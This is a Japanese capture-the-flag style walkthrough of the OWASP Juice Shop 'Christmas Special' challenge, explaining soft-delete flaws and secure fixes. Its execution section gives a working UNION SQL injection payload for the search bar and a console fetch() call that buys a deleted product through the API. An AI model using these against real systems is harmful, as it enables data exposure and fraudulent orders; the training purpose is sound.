# Christmas Special ✅

**難易度:** ⭐⭐⭐⭐
**カテゴリ:** SQLi + 論理削除バイパス
**目標:** 削除された商品をAPIで購入する

---

## 背景知識

### 論理削除（Soft Delete）とは

データベースでレコードを削除する方法は2種類ある:

```
┌─────────────────────────────────────────────────────────────────┐
│                  物理削除 vs 論理削除                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【物理削除 (Hard Delete)】                                      │
│  DELETE FROM Products WHERE id = 10                             │
│  → レコードが完全に消える                                        │
│  → 復元不可能                                                   │
│                                                                 │
│  【論理削除 (Soft Delete)】                                      │
│  UPDATE Products SET deletedAt = '2023-12-26' WHERE id = 10    │
│  → レコードは残っている                                         │
│  → deletedAt が設定されたものを「削除済み」として扱う            │
│  → 復元可能、監査証跡が残る                                     │
│                                                                 │
│  ┌──────────────────────────────────────────────────┐          │
│  │ id │ name              │ price │ deletedAt       │          │
│  ├────┼───────────────────┼───────┼─────────────────┤          │
│  │ 1  │ Apple Juice       │ 1.99  │ NULL            │ 有効     │
│  │ 2  │ Orange Juice      │ 2.99  │ NULL            │ 有効     │
│  │ 10 │ Christmas Special │ 9.99  │ 2023-12-26 ... │ 削除済み │
│  └──────────────────────────────────────────────────┘          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### なぜ脆弱か

UIでは `deletedAt IS NULL` のレコードのみ表示するが、**APIがこのチェックを忘れている**:

```
┌─────────────────────────────────────────────────────────────────┐
│                  脆弱性の原因                                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【フロントエンド (正しくフィルタ)】                              │
│  GET /api/Products                                              │
│  → WHERE deletedAt IS NULL のみ返す                            │
│  → Christmas Special は表示されない                             │
│                                                                 │
│  【カート追加API (チェック漏れ)】                                 │
│  POST /api/BasketItems { ProductId: 10, ... }                  │
│  → ProductId の存在確認のみ                                     │
│  → deletedAt をチェックしていない！                             │
│  → 削除済み商品もカートに追加できてしまう                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 日常的な例え

スーパーの売り場を想像してください:

- **棚から撤去**: 賞味期限切れの商品を棚から下げる（UI非表示）
- **在庫システム**: まだ在庫データベースには残っている
- **脆弱性**: 店員に商品コード（ID: 10）を伝えると、棚にない商品も買えてしまう

---

## 思考プロセス

### ステップ1: 隠れたデータの存在を推測

```
「商品一覧には表示されていない商品があるかも」
    ↓
「季節限定商品、廃止商品など」
    ↓
「データベースに残っているなら、SQLiで取得できる」
```

### ステップ2: SQLi で削除済み商品を探す

```
「deletedAt IS NOT NULL の条件で検索」
    ↓
「')) UNION SELECT id,name,description,... FROM Products WHERE deletedAt IS NOT NULL--」
    ↓
「Christmas Special (ID: 10) を発見！」
```

### ステップ3: API で直接購入を試みる

```
「UIからは買えないが、APIならどうか」
    ↓
「POST /api/BasketItems に ProductId: 10 を送信」
    ↓
「成功！カートに追加された」
    ↓
「APIは deletedAt をチェックしていない」
```

---

## 実行手順

### Step 1: SQLi で削除済み商品を探す

検索バーに以下を入力:

```sql
')) UNION SELECT id,name,description,4,5,6,7,8,9 FROM Products WHERE deletedAt IS NOT NULL--
```

結果に「Christmas Super-Surprise-Box (2014 Edition)」が表示される:
- **ID**: 10
- **名前**: Christmas Super-Surprise-Box (2014 Edition)
- **状態**: 削除済み（UIに非表示）

### Step 2: API でカートに追加

```javascript
// Console で実行
const result = await fetch('/api/BasketItems/', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({
    ProductId: 10,  // 削除済みの Christmas Special
    BasketId: sessionStorage.getItem('bid'),
    quantity: 1
  })
}).then(r => r.json());

console.log('Result:', result);
// → { status: "success", data: { ... } }
```

### Step 3: チェックアウト

カートページ（`/#/basket`）に移動し、チェックアウトを完了。

---

## Juice Shop の実際のコードパターン

### 脆弱なコード（推定）

Juice Shop の `routes/basket.ts` では、商品追加時に deletedAt をチェックしていない:

```typescript
// ❌ 脆弱なコード（Juice Shop のパターン）
// routes/basket.ts
export function addToBasket() {
  return async (req: Request, res: Response) => {
    const { ProductId, BasketId, quantity } = req.body

    // 商品の存在確認のみ
    const product = await ProductModel.findByPk(ProductId)
    if (!product) {
      return res.status(404).json({ error: 'Product not found' })
    }

    // ❌ deletedAt のチェックがない！
    // if (product.deletedAt) {
    //   return res.status(404).json({ error: 'Product not available' })
    // }

    // カートに追加
    await BasketItemModel.create({
      ProductId,
      BasketId,
      quantity
    })

    res.json({ status: 'success' })
  }
}
```

### 商品取得（正しくフィルタされている）

```typescript
// 商品一覧取得（こちらは正しい）
// routes/products.ts
export function searchProducts() {
  return async (req: Request, res: Response) => {
    const products = await ProductModel.findAll({
      where: {
        deletedAt: null  // ✓ 削除済みを除外
      }
    })
    res.json({ data: products })
  }
}
```

---

## 安全な実装

```typescript
// ✅ 安全なコード
// routes/basket.ts
export function addToBasket() {
  return async (req: Request, res: Response) => {
    const { ProductId, BasketId, quantity } = req.body

    // 1. 商品の存在確認
    const product = await ProductModel.findByPk(ProductId)
    if (!product) {
      return res.status(404).json({ error: 'Product not found' })
    }

    // 2. 削除済みチェック（これが重要！）
    if (product.deletedAt !== null) {
      return res.status(400).json({ error: 'Product is no longer available' })
    }

    // 3. 在庫チェック（任意）
    if (product.quantity < quantity) {
      return res.status(400).json({ error: 'Insufficient stock' })
    }

    // 4. カートに追加
    await BasketItemModel.create({
      ProductId,
      BasketId,
      quantity
    })

    res.json({ status: 'success' })
  }
}
```

### Sequelize のスコープを使った対策

```typescript
// models/Product.ts
@DefaultScope(() => ({
  where: {
    deletedAt: null  // デフォルトで削除済みを除外
  }
}))
@Table
export class Product extends Model {
  // ...
}

// これにより、findAll(), findByPk() などで自動的にフィルタされる
```

### 対策のチェックリスト

| チェック項目 | 説明 |
|-------------|------|
| ✅ **削除フラグ確認** | 全ての操作で `deletedAt` を確認 |
| ✅ **スコープ設定** | ORM のデフォルトスコープで自動フィルタ |
| ✅ **API 整合性** | フロントとバックエンドで同じフィルタ条件 |
| ✅ **監査ログ** | 削除済み商品へのアクセス試行を記録 |

---

## 論理削除を安全に使うためのベストプラクティス

### 1. 一貫したフィルタリング

```typescript
// 全ての商品クエリで deletedAt をチェック
const activeProducts = await Product.findAll({
  where: { deletedAt: null }
})
```

### 2. Paranoid モード（Sequelize）

```typescript
// モデル定義時に paranoid: true を設定
@Table({ paranoid: true })
export class Product extends Model {
  // deletedAt カラムが自動で管理される
  // destroy() で論理削除、findAll() で自動フィルタ
}
```

### 3. ポリシーの一元化

```typescript
// middleware/productPolicy.ts
export function ensureProductActive(req, res, next) {
  const product = req.product  // 事前にロード済み
  if (product.deletedAt) {
    return res.status(404).json({ error: 'Product not found' })
  }
  next()
}

// routes で使用
app.post('/api/BasketItems', loadProduct, ensureProductActive, addToBasket)
```

---

## 実世界での類似問題

### 非公開コンテンツへのアクセス

- 下書き状態の記事
- 非公開設定のプロフィール
- アーカイブされたプロジェクト

### 期限切れリソース

- 期限切れクーポン
- 終了したキャンペーン
- 販売終了商品

### アクセス権が剥奪されたデータ

- 退職した社員のアカウント
- 解約済みサブスクリプション
- ブロックされたユーザー

---

## 関連チャレンジ

- [Database Schema](../difficulty-3/database-schema.md) - UNION SQLi でテーブル構造を取得
- [GDPR Data Erasure](../difficulty-3/gdpr-data-erasure.md) - データ削除リクエスト
- [Ghost Login](../difficulty-3/ghost-login.md) - 削除されたアカウントへのログイン

## 参考リンク

- [OWASP - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [Sequelize Paranoid](https://sequelize.org/docs/v6/core-concepts/paranoid/)
- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
